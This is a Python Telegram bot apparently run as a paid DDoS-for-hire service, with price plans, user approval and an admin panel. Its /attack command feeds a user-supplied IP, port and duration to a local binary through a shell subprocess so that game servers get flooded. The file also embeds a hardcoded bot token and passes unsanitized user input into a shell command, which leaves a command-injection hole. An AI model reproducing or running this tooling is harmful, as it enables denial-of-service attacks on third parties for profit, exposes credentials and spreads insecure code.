import asyncio
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackContext
import datetime
import json
import os

TELEGRAM_BOT_TOKEN = '8024251249:AAH13LgxgJaR6WP7eALbxLRAyJwi7obx4D8'
ADMIN_USER_ID = 7855020275
USERS_FILE = 'users.json'
USERS_CPP_FILE = 'users.cpp'  # Assuming there is a users.cpp file
attack_in_progress = False
attack_end_time = None  # To track when the attack will end

# Load users from JSON
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

users = load_users()

# Check if a user is approved
def is_user_approved(user_id):
    user_id = str(user_id)
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d')
        if expiration_date > datetime.datetime.now():
            return True
        else:
            del users[user_id]
            save_users(users)
    return False

# Start command
async def start(update: Update, context: CallbackContext):
    user_name = update.effective_user.first_name
    chat_id = update.effective_chat.id
    message = (
        f"*🔥 Welcome {user_name} to the 🌚Raja VIP bot🔥*\n\n"
        "*Type /help for available commands.\n*"
        "*⚠️CONTACT THE OWNER FOR PURCHASE--> @rajaraj_04"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Help command
async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⭐Available Commands:🌟*\n\n"
        "/attack - Launch an attack 🔫\n\n"
        "/rule - View rules 📃\n\n"
        "/admin - Admin commands 👨\n\n"
        "/plane - View pricing details 💸\n\n"
        "/broadcast - Send a message to all users🎁\n"
        "/download - Download users files 📂\n"
        "⚠️CONTACT THE OWNER--> @rajaraj_04"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Rules command
async def rule(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⚠️ Rules:*\n\n\n"
        "1.🚨 Ek Time Pe Ek Hi Attack Lage Ga.\n\n"
        "2.🚨 200 Second Tak Hi Attack Lga Skte Ho."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Pricing command
async def plane(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⏰ Attack Time: 200 (S)*\n\n"
        "*Price💸*\n\n\n"
        "😑1 Day = 85 Rs\n"
        "❤️3 Days = 225 Rs\n"
        "😎1 Week = 400 Rs\n"
        "😈1 Month = 650 Rs\n"
        "🤑Lifetime = 800 Rs\n"
        "⚠️CONTACT THE ADMIN--> @rajaraj_04"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Admin command to manage users
async def Raja(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /Raja <add|rem> <user_id> <days>*", parse_mode='Markdown')
        return

    command, target_user_id, days = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        try:
            expiration_date = (datetime.datetime.now() + datetime.timedelta(days=int(days))).strftime('%Y-%m-%d')
            users[target_user_id] = expiration_date
            save_users(users)
            await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added for {days} days.*", parse_mode='Markdown')
        except ValueError:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid number of days.*", parse_mode='Markdown')
    elif command == 'rem':
        if target_user_id in users:
            del users[target_user_id]
            save_users(users)
            await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ User not found.*", parse_mode='Markdown')

# Run attack command
async def run_attack(chat_id, ip, port, duration, username, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))  # Set attack end time

    # Notify admin about the attack including the attacker's username
    await context.bot.send_message(ADMIN_USER_ID, text=(
        f"*⚔️ Attack Started by {username}! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
    ), parse_mode='Markdown')

    try:
        process = await asyncio.create_subprocess_shell(
            f"./Rahul {ip} {port} {duration} 1000",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        attack_end_time = None  # Reset the end time after the attack completes
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Raja Bot!*", parse_mode='Markdown')

# Attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "Unknown User"
    args = context.args

    if not is_user_approved(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You need to be approved to use this bot or your access has expired.\n*" "⚠️CONTACT THE OWNER--> @rajaraj_04", parse_mode='Markdown')
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            remaining_time_message = f"*⚠️ Another attack is already in progress.*\n*⏳ Remaining time: {int(remaining_time)} seconds.*"
            await context.bot.send_message(chat_id=chat_id, text=remaining_time_message, parse_mode='Markdown')
            return
        else:
            attack_in_progress = False  # Reset if the time has passed, though this should not happen in normal cases

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Check if the duration exceeds 200 seconds
    if int(duration) > 200:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack duration cannot exceed 200 seconds.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby  💥*\n\n"
        f"*🙏 Please Send Feedback To Admin--> @rajaraj_04"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, username, context))

# Admin broadcast message
async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    message = ' '.join(context.args)
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')
        except Exception as e:
            print(f"Failed to send message to {user_id}: {e}")

# Download user data

async def download(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    # Send the users file
    await context.bot.send_document(chat_id=chat_id, document=open(USERS_FILE, 'rb'), filename=USERS_FILE)

    # Optionally send the users.cpp file
    if os.path.exists(USERS_CPP_FILE):
        await context.bot.send_document(chat_id=chat_id, document=open(USERS_CPP_FILE, 'rb'), filename=USERS_CPP_FILE)

# Main function to start the bot
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', help_command))
    app.add_handler(CommandHandler('rule', rule))
    app.add_handler(CommandHandler('plane', plane))
    app.add_handler(CommandHandler('attack', attack))
    app.add_handler(CommandHandler('Raja', Raja))
    app.add_handler(CommandHandler('broadcast', broadcast))
    app.add_handler(CommandHandler('download', download))

    app.run_polling()

if __name__ == '__main__':
    main()
    